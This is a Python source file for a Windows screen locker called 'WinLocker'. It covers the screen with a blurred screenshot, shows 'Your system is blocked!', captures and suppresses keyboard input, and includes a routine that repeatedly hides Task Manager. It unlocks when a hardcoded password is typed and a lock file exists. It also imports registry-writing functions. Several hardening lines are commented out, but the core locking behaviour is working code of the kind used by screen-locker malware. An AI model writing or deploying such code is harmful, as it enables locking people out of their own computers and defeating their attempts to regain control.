import os
from tkinter import *
from winreg import OpenKey, KEY_ALL_ACCESS, REG_SZ, SetValueEx, CloseKey, DeleteValue, \
    HKEY_LOCAL_MACHINE

import keyboard
import pyautogui
import win32api
import win32con
import win32gui
from PIL import ImageFilter, ImageGrab

pyautogui.FAILSAFE = False
IS_RUNNING = True


def resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath(""), relative_path)


class WinLocker:
    def __init__(self, title, password):
        self.password = password

        self.screen = Tk()
        self.screen.title(title)
        # self.screen.attributes("-fullscreen", True)
        # self.screen.attributes("-topmost", True)
        # self.screen.after_idle(self.screen.attributes, '-topmost', True)
        # self.screen.protocol("WM_DELETE_WINDOW", self.do_exit)
        self.screen.resizable(height=False, width=False)
        self.screen.lift()
        self.screen.configure(background='#1c1c1c', cursor="none")

        from mss import mss
        with mss() as sct:
            sct.shot(output=resource_path('../screenshot.png'))

        from PIL import Image
        blurred_bg = Image.open(resource_path('../screenshot.png')).filter(ImageFilter.GaussianBlur)
        blurred_bg.save(resource_path(resource_path('../screenshot.png')))

        self.bg = PhotoImage(file=resource_path('../screenshot.png'))
        self.background_label = Label(self.screen, image=self.bg)
        self.background_label.place(x=0, y=0, relwidth=1, relheight=1)
        self.background_label.pack()

        self.field = Entry(self.screen, fg="white", bg="#1c1c1c", justify=CENTER, show="*", font="TimesNewRoman 30")
        self.field.configure(cursor="none")
        self.info_message = Label(self.screen, text='Your system is blocked!', font="TimesNewRoman 30", fg="white",
                                  bg="#1c1c1c")
        self.warn_message = Label(self.screen, text="Unauthorized USB drive detected!",
                                  font="TimesNewRoman 16", fg="red", bg="#1c1c1c")

        self.info_message.place(relx=.5, rely=.4, anchor="center")
        self.warn_message.place(relx=.50, rely=.45, anchor="center")
        self.field.place(width=500, height=50, relx=.5, rely=.55, anchor="center")
        self.screen.lift()
        self.field.focus_set()
        self.screen.update()

    def do_exit(self):
        pass

    def password_check(self):
        user_input = self.field.get()
        if self.password in user_input:
            return True

    def keypress_handler(self, key):
        if (key.scan_code in range(2, 15)) or \
                (key.scan_code in range(16, 28)) or \
                (key.scan_code in range(30, 42)) or \
                (key.scan_code in range(43, 54)):
            keyboard.send(key.scan_code, True, True)

        if key.scan_code == 28:
            if self.password_check():
                global IS_RUNNING
                IS_RUNNING = False
                os.remove('C:\\Program Files\\Windows Security\\SecureDrives\\.lock')
                self.screen.after(0, self.screen.destroy)
                keyboard.unhook_all()

    def show(self):
        keyboard.on_press(self.keypress_handler, suppress=True)
        self.screen.mainloop()


def get_file_description(windows_exe):  # find description of exe for different languages
    global description
    try:
        language, codepage = win32api.GetFileVersionInfo(windows_exe, '\\VarFileInfo\\Translation')[0]
        string_file_info = u'\\StringFileInfo\\%04X%04X\\%s' % (language, codepage, "FileDescription")
        description = win32api.GetFileVersionInfo(windows_exe, string_file_info)
    except Exception as err:
        print('error', err)

    return description


def disable_task_manager():
    task_manager_title = get_file_description('C:\Windows\System32\Taskmgr.exe')

    while IS_RUNNING:
        task_manager = win32gui.FindWindow(None, task_manager_title)
        win32gui.ShowWindow(task_manager, win32con.SW_HIDE)


if __name__ == '__main__':
    while True:
        if os.path.exists('C:\\Program Files\\Windows Security\\SecureDrives\\.lock'):
            locker = WinLocker(title="Locker", password='pass')
            locker.show()
            # disable_task_manager()
